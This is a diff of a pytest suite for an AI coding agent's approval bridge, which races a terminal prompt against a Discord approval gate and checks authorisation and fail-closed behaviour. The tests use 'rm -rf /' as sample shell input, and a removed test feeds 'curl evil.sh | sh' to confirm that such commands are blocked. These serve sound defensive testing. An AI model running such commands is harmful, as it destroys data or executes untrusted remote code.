@@ -1,1252 +1,1114 @@
-"""L4 approval bridge — AC-23..28, 37, 39a/b, 40, 41, 46..48, 52, 60, 61.
+"""C4 — the approval switch: both ways at once, exactly one winner.
 
-The layer's whole reason to exist is that ``set_approval_backend`` covers file
-operations only.  Shell runs past it: the core's prompt is gated on
-``sys.stdin.isatty()`` AND ``is_subagent()`` (``command_runner.py:1236,1241``),
-both False headless, so an unguarded bot would secure files and execute
-``rm -rf`` unasked.  AC-24 and AC-40 are the tests that would catch that.
+The layer this suite guards has no happy path worth much on its own.  What it
+has is a race between two branches, a prompt that must not exist twice, and a
+process-global flag whose loss turns Ctrl+C from "cancel this prompt" into
+"kill the agent run".  So the suite is built around the losing cases.
 
-Everything here runs without a Discord connection: the gate is posted through
-duck-typed channel/interaction doubles, which is enough because the plugin only
-ever calls ``send``/``edit``/``defer``/``send_message`` on them.
+**The prompt is faked, deliberately -- but not everywhere.**  Driving a real
+``prompt_toolkit`` Application through a pipe would make every timing test a
+coin flip, so the terminal branch runs against a double that answers on
+command.  The REAL Application is exercised separately (AC-89), because a
+double cannot prove that the thing we actually ship is operable.
 """
 
 from __future__ import annotations
 
 import asyncio
-from typing import Any, List, Optional
+import threading
+import time
 
 import pytest
 
-from code_puppy.plugins.cp_discord import (
-    approvals,
-    authz,
-    bindings,
-    concurrency,
-    gateway,
-)
+from cp_discord import approvals, approvals_ui, bindings, constants, reporter
+from cp_discord.bindings import Role
 
-ALICE = "alice"
-BOB = "bob"
-CHANNEL_A = 4242
-CHANNEL_B = 5353
-CHANNEL_C = 6464
-ALICE_DISCORD_ID = "1111"
-BOB_DISCORD_ID = "2222"
+
+APPROVER_ID = "4242"
+STRANGER_ID = "9999"
+TALKER_ONLY_ID = "7777"
 
 
 # --------------------------------------------------------------------------- #
-# Doubles
+# Harness
 # --------------------------------------------------------------------------- #
-
-
-class FakeMessage:
-    """A posted gate message; records every edit it receives."""
-
-    def __init__(self, channel: "FakeChannel", content: str, view: Any) -> None:
-        self.channel = channel
-        self.content = content
-        #: What was ORIGINALLY posted. Kept apart from ``content`` because the
-        #: outcome edit overwrites the latter, which would otherwise erase the
-        #: very text a "did the request reach the channel?" assertion needs.
-        self.posted = content
-        self.view = view
-        self.edits: List[str] = []
-
-    async def edit(self, content: str = None, view: Any = None, **_: Any) -> None:
-        if content is not None:
-            self.content = content
-            self.edits.append(content)
-        if view is not None:
-            self.view = view
-
-
-class FakeChannel:
-    def __init__(self, channel_id: int) -> None:
-        self.id = channel_id
-        self.sent: List[FakeMessage] = []
-        self.send_error: Optional[Exception] = None
-
-    async def send(self, content: str = None, view: Any = None, **_: Any):
-        if self.send_error is not None:
-            raise self.send_error
-        message = FakeMessage(self, content or "", view)
-        self.sent.append(message)
-        return message
-
-
-class FakeClient:
-    def __init__(self, *channel_ids: int) -> None:
-        self.channels = {cid: FakeChannel(cid) for cid in channel_ids}
-
-    def get_channel(self, channel_id: int):
-        return self.channels.get(channel_id)
-
-    async def fetch_channel(self, channel_id: int):
-        channel = self.channels.get(channel_id)
-        if channel is None:
-            raise RuntimeError(f"unknown channel {channel_id}")
-        return channel
-
-
-class FakeResponse:
-    def __init__(self) -> None:
-        self.deferred = False
-        self.ephemeral: List[str] = []
-
-    async def defer(self, *_: Any, **__: Any) -> None:
-        self.deferred = True
-
-    async def send_message(self, content: str = None, **kwargs: Any) -> None:
-        assert kwargs.get("ephemeral") is True, "refusals must not be public"
-        self.ephemeral.append(content or "")
-
-
-class FakeUser:
-    def __init__(self, user_id: str) -> None:
-        self.id = int(user_id)
-
-
-class FakeInteraction:
-    def __init__(self, user_id: str) -> None:
-        self.response = FakeResponse()
-        self.user = FakeUser(user_id)
-
-
-# --------------------------------------------------------------------------- #
-# Fixtures
-# --------------------------------------------------------------------------- #
-
-
-@pytest.fixture(autouse=True)
-def _isolated(tmp_path, monkeypatch):
-    """Fresh identity DB, no leftover gates, no leftover hooks."""
-    monkeypatch.setenv(bindings.DB_PATH_ENV, str(tmp_path / "authz.db"))
-    bindings.forget_initialized_paths()
-    authz.clear_state()
-    approvals.reset_state()
-    yield
-    approvals.uninstall()
-    approvals.reset_state()
-    authz.clear_state()
-    gateway.set_connection(None, None)
-    bindings.forget_initialized_paths()
 
 
 @pytest.fixture
-async def client():
-    """A connected gateway bound to THIS test's running loop.
+def authz_db(tmp_path, monkeypatch):
+    """A throwaway bindings database with one approver in it."""
+    monkeypatch.setenv(bindings.DB_PATH_ENV, str(tmp_path / "authz.db"))
+    bindings.forget_initialized_paths()
+    bindings.bind(constants.AUTHZ_CHANNEL, APPROVER_ID, "wayne")
+    bindings.grant("wayne", Role.APPROVER)
+    bindings.bind(constants.AUTHZ_CHANNEL, TALKER_ONLY_ID, "mary")
+    bindings.grant("mary", Role.TALKER)
+    yield
+    bindings.forget_initialized_paths()
 
-    The fixture has to be async: ``run_coroutine_threadsafe`` posts onto
-    exactly the loop registered here, so a loop that is not the one the test
-    runs on would leave every gate unanswered forever.
+
+class FakePrompt:
+    """Stands in for the terminal branch: goes live on command, answers later.
+
+    ``run`` blocks exactly like the real one, so the backend's waiting, its
+    mark transitions and its slot handling are all exercised for real -- only
+    the terminal is imaginary.
     """
-    fake = FakeClient(CHANNEL_A, CHANNEL_B, CHANNEL_C)
-    gateway.set_connection(fake, asyncio.get_running_loop())
-    return fake
+
+    instances: list["FakePrompt"] = []
+
+    def __init__(self, gate, *, fail: bool = False, live: bool = True) -> None:
+        self.gate = gate
+        self._fail = fail
+        self._live = live
+        self._answer: "threading.Event" = threading.Event()
+        self._value = None
+        self.exited_with = None
+        self.went_live = False
+        self.running = threading.Event()
+        FakePrompt.instances.append(self)
+
+    # -- what approvals.py calls ---------------------------------------
+
+    def run(self, *, on_live):
+        if self._fail:
+            raise RuntimeError("this terminal cannot host a prompt")
+        if self._live:
+            self.went_live = on_live()
+            if not self.went_live:
+                return None
+        self.running.set()
+        self._answer.wait(5)
+        return self._value
+
+    def exit_with(self, approved: bool) -> None:
+        self.exited_with = approved
+        self.answer(approved)
+
+    # -- what the tests call -------------------------------------------
+
+    def answer(self, value) -> None:
+        self._value = value
+        self._answer.set()
 
 
-def _approver(external_id: str, principal: str) -> None:
-    bindings.bind(gateway.SESSION_PREFIX, external_id, principal)
-    bindings.grant(principal, bindings.Role.TALKER)
-    bindings.grant(principal, bindings.Role.APPROVER)
+@pytest.fixture
+def prompts(monkeypatch):
+    """Install the fake prompt and hand tests a handle on what was built."""
+    FakePrompt.instances = []
+    made = {"fail": False, "live": True}
+
+    def factory(gate):
+        return FakePrompt(gate, fail=made["fail"], live=made["live"])
+
+    monkeypatch.setattr(approvals, "_prompt_factory", factory)
+    monkeypatch.setattr(approvals, "_stdin_is_interactive", lambda: True)
+    yield made
+    for prompt in FakePrompt.instances:
+        prompt.answer(False)
 
 
-def _talker_only(external_id: str, principal: str) -> None:
-    bindings.bind(gateway.SESSION_PREFIX, external_id, principal)
-    bindings.grant(principal, bindings.Role.TALKER)
+class FakeClient:
+    """C2's surface, as C4 uses it: submit a gate, close a gate."""
+
+    def __init__(self, *, accepts: bool = True) -> None:
+        self.accepts = accepts
+        self.submitted: list[dict] = []
+        self.closed: list[tuple] = []
+
+    def submit_gate(
+        self, gate_id, title, body, *, preview=None, remote_resolvable=True
+    ):
+        self.submitted.append(
+            {
+                "gate_id": gate_id,
+                "title": title,
+                "body": body,
+                "preview": preview,
+                "remote_resolvable": remote_resolvable,
+            }
+        )
+        return self.accepts
+
+    def close_gate(self, gate_id, outcome, *, title=""):
+        self.closed.append((gate_id, outcome, title))
+        return True
 
 
-def _own(channel_id: int, principal: str) -> str:
-    """Make *principal* the owner of *channel_id*'s session, as L2 would."""
-    session_id = gateway.session_id_for(channel_id)
-    authz.bind_session_principal(session_id, principal)
-    return session_id
+@pytest.fixture
+def discord(monkeypatch):
+    """A reachable broker by default; tests switch it off where it matters."""
+    client = FakeClient()
+    monkeypatch.setattr(approvals, "_active_client", lambda: client)
+    return client
 
 
-async def _wait_for_gate(channel: FakeChannel, index: int = 0) -> FakeMessage:
-    for _ in range(400):
-        if len(channel.sent) > index:
-            return channel.sent[index]
-        await asyncio.sleep(0.005)
-    raise AssertionError(f"no gate posted in channel {channel.id}")
+@pytest.fixture(autouse=True)
+def clean_state(monkeypatch):
+    """Every test starts with an empty registry and a silent core flag."""
+    flags: list[tuple] = []
+    monkeypatch.setattr(
+        approvals, "_set_core_flag", lambda value: flags.append(("flag", value))
+    )
+    approvals.reset_state()
+    approvals.core_flag_calls = flags
+    yield flags
+    approvals.reset_state()
 
 
-async def _click(message: FakeMessage, label: str, user_id: str) -> FakeInteraction:
-    button = next(c for c in message.view.children if c.label == label)
-    interaction = FakeInteraction(user_id)
-    await button.callback(interaction)
-    return interaction
+def backend_in_thread(title="Shell Command", message="`rm -rf /`", preview=None):
+    """Run the backend off-thread; it blocks, which is the whole point."""
+    result = {}
+    done = threading.Event()
+
+    def run():
+        try:
+            result["value"] = approvals.approval_backend(title, message, preview)
+        except BaseException as error:  # pragma: no cover - surfaced by the test
+            result["error"] = error
+        finally:
+            done.set()
+
+    thread = threading.Thread(target=run, name="backend", daemon=True)
+    thread.start()
+    return result, done, thread
 
 
-async def _approve(channel: FakeChannel, user_id: str, index: int = 0):
-    message = await _wait_for_gate(channel, index)
-    return await _click(message, approvals.APPROVE_LABEL, user_id)
+def wait_for_prompt(index: int = 0, timeout: float = 5.0) -> FakePrompt:
+    deadline = time.monotonic() + timeout
+    while time.monotonic() < deadline:
+        if len(FakePrompt.instances) > index:
+            prompt = FakePrompt.instances[index]
+            if prompt.running.wait(0.1) or prompt.went_live is False:
+                return prompt
+        time.sleep(0.01)
+    raise AssertionError(f"no prompt #{index} appeared")
 
 
-async def _deny(channel: FakeChannel, user_id: str, index: int = 0):
-    message = await _wait_for_gate(channel, index)
-    return await _click(message, approvals.DENY_LABEL, user_id)
+def _wait_until(predicate, timeout: float = 5.0) -> None:
+    deadline = time.monotonic() + timeout
+    while time.monotonic() < deadline:
+        if predicate():
+            return
+        time.sleep(0.01)
+    raise AssertionError("condition never became true")
+
+
+def wait_for_gate(timeout: float = 5.0) -> str:
+    deadline = time.monotonic() + timeout
+    while time.monotonic() < deadline:
+        open_gates = approvals.open_gates()
+        if open_gates:
+            return open_gates[0]
+        time.sleep(0.01)
+    raise AssertionError("no gate was opened")
 
 
 # --------------------------------------------------------------------------- #
-# AC-23 — a file approval reaches Discord instead of stdin
+# AC-28 / AC-29 / AC-30 — BOTH ways, always
 # --------------------------------------------------------------------------- #
 
 
-async def test_ac23_file_approval_is_posted_to_the_channel(client):
-    _approver(ALICE_DISCORD_ID, ALICE)
-    session_id = _own(CHANNEL_A, ALICE)
-    approvals.install()
+def test_ac28_every_approval_goes_both_ways(authz_db, prompts, discord):
+    result, done, _ = backend_in_thread()
+    prompt = wait_for_prompt()
 
+    assert discord.submitted, "no gate reached Discord"
+    assert prompt.went_live is True, "no terminal prompt was started"
+
+    prompt.answer(True)
+    assert done.wait(5)
+    assert result["value"] == (True, None)
+
+
+def test_ac29_a_terminal_run_is_answerable_from_the_phone(authz_db, prompts, discord):
+    """The core scenario: started at the PC, answered on the phone."""
+    result, done, _ = backend_in_thread()
+    wait_for_prompt()
+    gate_id = discord.submitted[0]["gate_id"]
+
+    refusal = approvals.on_gate_resolved(
+        gate_id=gate_id,
+        decision=approvals_ui.DECISION_APPROVE,
+        discord_user_id=APPROVER_ID,
+    )
+
+    assert refusal is None
+    assert done.wait(5)
+    assert result["value"] == (True, None)
+
+
+def test_ac48_a_discord_approval_returns_TRUE_not_a_cancellation(
+    authz_db, prompts, discord
+):
+    """``exit(result=...)``, not ``exit()``: a bare abort would deny."""
+    result, done, _ = backend_in_thread()
+    prompt = wait_for_prompt()
+
+    approvals.on_gate_resolved(
+        gate_id=discord.submitted[0]["gate_id"],
+        decision=approvals_ui.DECISION_APPROVE,
+        discord_user_id=APPROVER_ID,
+    )
+    done.wait(5)
+
+    assert prompt.exited_with is True
+    assert result["value"] == (True, None)
+
+
+def test_ac30_three_gates_in_sequence_all_resolve(authz_db, prompts, discord):
+    for index, expected in enumerate((True, False, True)):
+        result, done, _ = backend_in_thread()
+        prompt = wait_for_prompt(index)
+        prompt.answer(expected)
+        assert done.wait(5)
+        assert result["value"] == (expected, None)
+
+
+# --------------------------------------------------------------------------- #
+# AC-31 / AC-32 — the slot is never emptied
+# --------------------------------------------------------------------------- #
+
+
+def test_ac31_the_backend_slot_is_never_emptied(authz_db, prompts, discord):
     from code_puppy.tools.common import get_approval_backend
 
-    backend = get_approval_backend()
-    assert backend is approvals.approval_backend
+    approvals.install()
+    try:
+        result, done, _ = backend_in_thread()
+        wait_for_prompt()
 
-    channel = client.channels[CHANNEL_A]
-    gate = asyncio.ensure_future(
-        asyncio.to_thread(backend, session_id, "File Operation", "write to x.py", None)
+        assert get_approval_backend() is not None
+
+        wait_for_prompt().answer(True)
+        done.wait(5)
+        assert get_approval_backend() is not None
+    finally:
+        approvals.uninstall()
+
+
+def test_ac32_a_discord_request_during_a_live_prompt_is_delivered(
+    authz_db, prompts, discord
+):
+    result, done, _ = backend_in_thread()
+    prompt = wait_for_prompt()
+    assert prompt.running.wait(5)
+
+    approvals.on_gate_resolved(
+        gate_id=discord.submitted[0]["gate_id"],
+        decision=approvals_ui.DECISION_DENY,
+        discord_user_id=APPROVER_ID,
     )
-    await _approve(channel, ALICE_DISCORD_ID)
 
-    assert await gate == (True, None)
-    assert "write to x.py" in channel.sent[0].posted
+    assert done.wait(5)
+    assert result["value"] == (False, None)
 
 
-async def test_ac23_denial_from_discord_is_reported_as_denial(client):
-    _approver(ALICE_DISCORD_ID, ALICE)
-    session_id = _own(CHANNEL_A, ALICE)
-    approvals.install()
+# --------------------------------------------------------------------------- #
+# AC-64a / AC-64b — the two windows the three-valued mark exists for
+# --------------------------------------------------------------------------- #
 
-    gate = asyncio.ensure_future(
-        asyncio.to_thread(
-            approvals.approval_backend, session_id, "File Operation", "rm -rf /", None
+
+def test_ac64a_discord_wins_before_the_prompt_starts(authz_db, monkeypatch, discord):
+    """Window 1: the mark is still EMPTY, so ``exit()`` would evaporate."""
+    resolved = threading.Event()
+
+    def factory(gate):
+        raise AssertionError("no prompt may be built for an already-decided gate")
+
+    monkeypatch.setattr(approvals, "_stdin_is_interactive", lambda: True)
+    monkeypatch.setattr(approvals, "_prompt_factory", factory)
+
+    def resolve_first(gate):
+        # Runs where the backend has posted the gate but not yet reached the
+        # terminal branch: exactly the window AC-64a describes.
+        approvals.on_gate_resolved(
+            gate_id=gate.gate_id,
+            decision=approvals_ui.DECISION_APPROVE,
+            discord_user_id=APPROVER_ID,
         )
+        resolved.set()
+
+    monkeypatch.setattr(approvals, "_after_gate_posted", resolve_first)
+
+    result, done, _ = backend_in_thread()
+
+    assert done.wait(5)
+    assert resolved.is_set()
+    assert result["value"] == (True, None)
+    assert approvals.prompt_mark() == approvals.MARK_EMPTY
+
+
+def test_ac64b_discord_wins_while_the_mark_is_pending(
+    authz_db, prompts, discord, monkeypatch
+):
+    """Window 2: PENDING -- no ``exit()`` may be called, step 3a collects it.
+
+    The resolution is injected in the FACTORY: the mark is PENDING from the
+    moment the slot is taken until the prompt reports itself live, and the
+    factory runs squarely inside that window.
+    """
+    built = threading.Event()
+    original = approvals._prompt_factory
+
+    def factory(gate):
+        assert approvals.prompt_mark() == approvals.MARK_PENDING
+        approvals.on_gate_resolved(
+            gate_id=gate.gate_id,
+            decision=approvals_ui.DECISION_APPROVE,
+            discord_user_id=APPROVER_ID,
+        )
+        built.set()
+        return original(gate)
+
+    monkeypatch.setattr(approvals, "_prompt_factory", factory)
+
+    result, done, _ = backend_in_thread()
+
+    assert built.wait(5), "the prompt was never built"
+    assert done.wait(5)
+    prompt = FakePrompt.instances[0]
+    assert prompt.went_live is False, "an operable prompt appeared for a decided gate"
+    assert prompt.exited_with is None, "exit() was called on a non-live Application"
+    assert result["value"] == (True, None)
+
+
+# --------------------------------------------------------------------------- #
+# AC-88 — mark and slot come back on EVERY exit
+# --------------------------------------------------------------------------- #
+
+
+@pytest.mark.parametrize("outcome", ["terminal", "discord", "abort", "exception"])
+def test_ac88_two_gates_in_a_row_both_get_a_real_prompt(
+    authz_db, prompts, discord, outcome
+):
+    """The normal case of every run -- and it was in no AC until R8.
+
+    The two ABORT cases deliberately do NOT expect the backend to return: a
+    dead terminal branch is not a winner while the phone still has an open
+    gate (INV-C7, AC-33).  What they DO expect is the mark, the slot and the
+    app reference back, so gate 2 gets a real prompt -- which is what AC-88 is
+    actually about.
+    """
+    result, done, _ = backend_in_thread()
+    prompt = wait_for_prompt()
+    first_gate = discord.submitted[0]["gate_id"]
+
+    if outcome == "terminal":
+        prompt.answer(True)
+        assert done.wait(5)
+    elif outcome == "discord":
+        approvals.on_gate_resolved(
+            gate_id=first_gate,
+            decision=approvals_ui.DECISION_APPROVE,
+            discord_user_id=APPROVER_ID,
+        )
+        assert done.wait(5)
+    elif outcome == "abort":
+        prompt.answer(None)
+    else:
+        prompt.answer(_Explode())
+
+    _wait_until(lambda: approvals.prompt_slot() is None)
+    assert approvals.prompt_mark() == approvals.MARK_EMPTY
+    assert approvals.live_application() is None
+
+    result2, done2, _ = backend_in_thread()
+    second = wait_for_prompt(1)
+    assert second.went_live is True, "gate 2 got no operable prompt"
+    second.answer(True)
+    assert done2.wait(5)
+    assert result2["value"] == (True, None)
+
+    if outcome in ("abort", "exception"):
+        # The first gate is STILL answerable from the phone -- that is the
+        # point of calling a branch failure an abort rather than a denial.
+        assert first_gate in approvals.open_gates()
+        approvals.on_gate_resolved(
+            gate_id=first_gate,
+            decision=approvals_ui.DECISION_APPROVE,
+            discord_user_id=APPROVER_ID,
+        )
+        assert done.wait(5)
+        assert result["value"] == (True, None)
+
+
+class _Explode:
+    """A prompt answer that blows up when the backend reads it."""
+
+    def __bool__(self):
+        raise RuntimeError("boom")
+
+
+# --------------------------------------------------------------------------- #
+# AC-33 / AC-35 — a branch failure is not a winner
+# --------------------------------------------------------------------------- #
+
+
+def test_ac33_a_broken_terminal_branch_leaves_the_gate_open(authz_db, prompts, discord):
+    """INV-C7: fail-closed only when BOTH branches ended without a winner."""
+    prompts["fail"] = True
+    result, done, _ = backend_in_thread()
+    gate_id = wait_for_gate()
+
+    assert not done.wait(0.3), "the backend denied while the phone still had a gate"
+
+    approvals.on_gate_resolved(
+        gate_id=gate_id,
+        decision=approvals_ui.DECISION_APPROVE,
+        discord_user_id=APPROVER_ID,
     )
-    await _deny(client.channels[CHANNEL_A], ALICE_DISCORD_ID)
 
-    assert await gate == (False, None)
+    assert done.wait(5)
+    assert result["value"] == (True, None)
+
+
+def test_ac35_both_branches_dead_fails_closed(authz_db, prompts, monkeypatch):
+    monkeypatch.setattr(approvals, "_active_client", lambda: None)
+    prompts["fail"] = True
+
+    result, done, _ = backend_in_thread()
+
+    assert done.wait(5)
+    assert result["value"] == (False, None)
+
+
+def test_ac35_an_undeliverable_gate_and_no_stdin_fails_closed(
+    authz_db, prompts, monkeypatch
+):
+    monkeypatch.setattr(approvals, "_active_client", lambda: FakeClient(accepts=False))
+    monkeypatch.setattr(approvals, "_stdin_is_interactive", lambda: False)
+
+    result, done, _ = backend_in_thread()
+
+    assert done.wait(5)
+    assert result["value"] == (False, None)
+
+
+def test_ac34_the_backend_never_calls_the_core_approval(authz_db, prompts, discord):
+    """INV-C6: that would land on the same check again -- infinite recursion."""
+    import code_puppy.tools.common as common
+
+    calls = []
+    original = common.get_user_approval
+    common.get_user_approval = lambda *a, **k: calls.append(a) or (True, None)
+    try:
+        result, done, _ = backend_in_thread()
+        wait_for_prompt().answer(True)
+        done.wait(5)
+    finally:
+        common.get_user_approval = original
+
+    assert calls == []
 
 
 # --------------------------------------------------------------------------- #
-# AC-24 — the shell hook blocks; THE most dangerous single defect
+# AC-49 / AC-63 / AC-65 — the timeout belongs to the Discord branch ALONE
 # --------------------------------------------------------------------------- #
 
 
-async def test_ac24_shell_command_without_approval_is_blocked(client):
-    _approver(ALICE_DISCORD_ID, ALICE)
-    approvals.install()
+def test_ac49_the_discord_timeout_leaves_the_terminal_prompt_open(
+    authz_db, prompts, discord, monkeypatch
+):
+    monkeypatch.setattr(approvals, "GATE_TIMEOUT_SECONDS", 0.05)
 
-    with concurrency.session_scope(gateway.session_id_for(CHANNEL_A)):
-        _own(CHANNEL_A, ALICE)
-        hook = asyncio.ensure_future(
-            approvals.on_run_shell_command(None, "rm -rf /", None, 60)
+    result, done, _ = backend_in_thread()
+    prompt = wait_for_prompt()
+    assert prompt.running.wait(5)
+
+    time.sleep(0.3)
+    assert not done.is_set(), "the timeout ended the terminal branch too"
+
+    prompt.answer(True)
+    assert done.wait(5)
+    assert result["value"] == (True, None)
+
+
+def test_ac63_a_dead_broker_kills_only_the_discord_branch(
+    authz_db, prompts, monkeypatch
+):
+    monkeypatch.setattr(approvals, "_active_client", lambda: FakeClient(accepts=False))
+
+    result, done, _ = backend_in_thread()
+    prompt = wait_for_prompt()
+    assert prompt.running.wait(5)
+
+    prompt.answer(False)
+    assert done.wait(5)
+    assert result["value"] == (False, None)
+
+
+def test_ac65_without_a_broker_the_terminal_branch_has_no_timeout(
+    authz_db, prompts, monkeypatch
+):
+    monkeypatch.setattr(approvals, "_active_client", lambda: None)
+    monkeypatch.setattr(approvals, "GATE_TIMEOUT_SECONDS", 0.05)
+
+    result, done, _ = backend_in_thread()
+    prompt = wait_for_prompt()
+    assert prompt.running.wait(5)
+
+    time.sleep(0.3)
+    assert not done.is_set(), "the terminal branch inherited Discord's timeout"
+
+    prompt.answer(True)
+    assert done.wait(5)
+    assert result["value"] == (True, None)
+
+
+# --------------------------------------------------------------------------- #
+# AC-86 — stdin that cannot be prompted on
+# --------------------------------------------------------------------------- #
+
+
+def test_ac86a_no_stdin_but_a_broker_runs_only_the_discord_branch(
+    authz_db, prompts, discord, monkeypatch
+):
+    monkeypatch.setattr(approvals, "_stdin_is_interactive", lambda: False)
+
+    result, done, _ = backend_in_thread()
+    gate_id = wait_for_gate()
+
+    approvals.on_gate_resolved(
+        gate_id=gate_id,
+        decision=approvals_ui.DECISION_APPROVE,
+        discord_user_id=APPROVER_ID,
+    )
+    assert done.wait(5)
+    assert result["value"] == (True, None)
+    # Checked AFTER the backend returned, not before: asserting on an empty
+    # list while the prompt thread has not been scheduled yet would pass
+    # whether or not the stdin guard exists.
+    assert FakePrompt.instances == [], "a prompt was started without a usable stdin"
+    assert approvals.prompt_slot() is None
+
+
+def test_ac86b_no_stdin_and_no_broker_fails_closed_like_the_core(
+    authz_db, prompts, monkeypatch
+):
+    monkeypatch.setattr(approvals, "_stdin_is_interactive", lambda: False)
+    monkeypatch.setattr(approvals, "_active_client", lambda: None)
+
+    result, done, _ = backend_in_thread()
+
+    assert done.wait(5)
+    assert result["value"] == (False, None)
+    assert FakePrompt.instances == []
+
+
+def test_ac86c_stdin_and_a_broker_run_both(authz_db, prompts, discord):
+    result, done, _ = backend_in_thread()
+    prompt = wait_for_prompt()
+
+    assert discord.submitted
+    assert prompt.went_live is True
+
+    prompt.answer(True)
+    done.wait(5)
+
+
+# --------------------------------------------------------------------------- #
+# AC-73 / AC-74 / AC-75 — who may click (INV-C25)
+# --------------------------------------------------------------------------- #
+
+
+def test_ac73_an_approver_may_click_without_a_discord_requester(
+    authz_db, prompts, discord
+):
+    """The whole point: a terminal session has no Discord requester at all."""
+    result, done, _ = backend_in_thread()
+    gate_id = wait_for_gate()
+
+    assert (
+        approvals.on_gate_resolved(
+            gate_id=gate_id,
+            decision=approvals_ui.DECISION_APPROVE,
+            discord_user_id=APPROVER_ID,
         )
-        await _deny(client.channels[CHANNEL_A], ALICE_DISCORD_ID)
-        result = await hook
+        is None
+    )
+    assert done.wait(5)
+    assert result["value"] == (True, None)
 
-    assert result["blocked"] is True
-    assert "rm -rf /" in client.channels[CHANNEL_A].sent[0].posted
+
+def test_ac74_a_stranger_is_refused_and_the_gate_stays_open(authz_db, prompts, discord):
+    result, done, _ = backend_in_thread()
+    gate_id = wait_for_gate()
+
+    refusal = approvals.on_gate_resolved(
+        gate_id=gate_id,
+        decision=approvals_ui.DECISION_APPROVE,
+        discord_user_id=STRANGER_ID,
+    )
+
+    assert refusal is not None
+    assert not done.wait(0.3), "an unauthorized click resolved the gate"
+    assert gate_id in approvals.open_gates()
+
+    wait_for_prompt().answer(False)
+    done.wait(5)
 
 
-async def test_ac24_approved_shell_command_is_allowed(client):
-    _approver(ALICE_DISCORD_ID, ALICE)
-    approvals.install()
+def test_ac74_a_talker_who_is_not_an_approver_is_refused(authz_db, prompts, discord):
+    """Talking rights never carry approval rights -- two independent axes."""
+    result, done, _ = backend_in_thread()
+    gate_id = wait_for_gate()
 
-    with concurrency.session_scope(gateway.session_id_for(CHANNEL_A)):
-        _own(CHANNEL_A, ALICE)
-        hook = asyncio.ensure_future(
-            approvals.on_run_shell_command(None, "ls -la", None, 60)
+    refusal = approvals.on_gate_resolved(
+        gate_id=gate_id,
+        decision=approvals_ui.DECISION_APPROVE,
+        discord_user_id=TALKER_ONLY_ID,
+    )
+
+    assert refusal is not None
+    assert gate_id in approvals.open_gates()
+    wait_for_prompt().answer(False)
+    done.wait(5)
+
+
+def test_ac75_an_approver_without_talker_may_still_approve(authz_db, prompts, discord):
+    """The gate path does NOT run ``check_message`` (it would test TALKER)."""
+    assert bindings.has_role("wayne", Role.TALKER) is False
+
+    result, done, _ = backend_in_thread()
+    gate_id = wait_for_gate()
+
+    assert (
+        approvals.on_gate_resolved(
+            gate_id=gate_id,
+            decision=approvals_ui.DECISION_APPROVE,
+            discord_user_id=APPROVER_ID,
         )
-        await _approve(client.channels[CHANNEL_A], ALICE_DISCORD_ID)
-        assert await hook is None
+        is None
+    )
+    assert done.wait(5)
+    assert result["value"] == (True, None)
 
 
-async def test_ac24_shell_without_a_session_is_blocked_not_executed(client):
-    """No attributable session means no gate can be posed -> refuse (INV-3)."""
-    approvals.install()
-    result = await approvals.on_run_shell_command(None, "curl evil.sh | sh", None, 60)
-
-    assert result["blocked"] is True
-    assert client.channels[CHANNEL_A].sent == []
-
-
-async def test_ac24_hook_is_registered_on_the_run_shell_command_phase():
-    from code_puppy.callbacks import get_callbacks
-
-    approvals.install()
-    assert approvals.on_run_shell_command in get_callbacks("run_shell_command")
+def test_a_click_on_an_unknown_gate_is_refused(authz_db):
+    assert approvals.on_gate_resolved(
+        gate_id="nope",
+        decision=approvals_ui.DECISION_APPROVE,
+        discord_user_id=APPROVER_ID,
+    )
 
 
 # --------------------------------------------------------------------------- #
-# AC-25 — N open gates keep their sessions apart
+# AC-36 / AC-37 / AC-38 / AC-39 — exactly one resolution
 # --------------------------------------------------------------------------- #
 
 
-async def test_ac25_three_open_gates_do_not_cross_talk(client):
-    _approver(ALICE_DISCORD_ID, ALICE)
-    approvals.install()
+def test_ac36_a_discord_click_ends_the_terminal_prompt(authz_db, prompts, discord):
+    result, done, _ = backend_in_thread()
+    prompt = wait_for_prompt()
+    assert prompt.running.wait(5)
 
-    channels = [CHANNEL_A, CHANNEL_B, CHANNEL_C]
-    gates = []
-    for channel_id in channels:
-        session_id = _own(channel_id, ALICE)
-        gates.append(
-            asyncio.ensure_future(
-                asyncio.to_thread(
-                    approvals.approval_backend,
-                    session_id,
-                    "File Operation",
-                    f"write to {channel_id}.py",
-                    None,
+    approvals.on_gate_resolved(
+        gate_id=discord.submitted[0]["gate_id"],
+        decision=approvals_ui.DECISION_APPROVE,
+        discord_user_id=APPROVER_ID,
+    )
+    done.wait(5)
+
+    assert prompt.exited_with is True
+
+
+def test_ac37_a_terminal_answer_closes_the_discord_gate(authz_db, prompts, discord):
+    result, done, _ = backend_in_thread()
+    wait_for_prompt().answer(True)
+    assert done.wait(5)
+
+    assert discord.closed, "the gate was left live in the channel"
+    gate_id, outcome, _title = discord.closed[0]
+    assert gate_id == discord.submitted[0]["gate_id"]
+    assert "Terminal" in outcome
+
+
+def test_ac38_a_simultaneous_race_yields_exactly_one_resolution(
+    authz_db, prompts, discord
+):
+    for _ in range(20):
+        FakePrompt.instances = []
+        discord.submitted.clear()
+        result, done, _ = backend_in_thread()
+        prompt = wait_for_prompt(0)
+        assert prompt.running.wait(5)
+        gate_id = discord.submitted[0]["gate_id"]
+
+        barrier = threading.Barrier(2)
+        outcomes = []
+
+        def from_discord():
+            barrier.wait()
+            outcomes.append(
+                approvals.on_gate_resolved(
+                    gate_id=gate_id,
+                    decision=approvals_ui.DECISION_APPROVE,
+                    discord_user_id=APPROVER_ID,
                 )
             )
-        )
 
-    # Each channel must have received exactly its OWN request.
-    for channel_id in channels:
-        message = await _wait_for_gate(client.channels[channel_id])
-        assert f"write to {channel_id}.py" in message.posted
-        assert len(client.channels[channel_id].sent) == 1
+        def from_terminal():
+            barrier.wait()
+            prompt.answer(False)
 
-    # Approve A and C, deny B -- the answers must not migrate.
-    await _approve(client.channels[CHANNEL_A], ALICE_DISCORD_ID)
-    await _deny(client.channels[CHANNEL_B], ALICE_DISCORD_ID)
-    await _approve(client.channels[CHANNEL_C], ALICE_DISCORD_ID)
+        threads = [
+            threading.Thread(target=from_discord),
+            threading.Thread(target=from_terminal),
+        ]
+        for thread in threads:
+            thread.start()
+        for thread in threads:
+            thread.join(5)
 
-    assert [await g for g in gates] == [(True, None), (False, None), (True, None)]
-
-
-# --------------------------------------------------------------------------- #
-# AC-26 — the backend on the gateway loop denies instead of deadlocking
-# --------------------------------------------------------------------------- #
+        assert done.wait(5)
+        assert result["value"][0] in (True, False)
+        assert approvals.prompt_mark() == approvals.MARK_EMPTY
 
 
-async def test_ac26_backend_called_on_the_gateway_loop_denies_immediately(client):
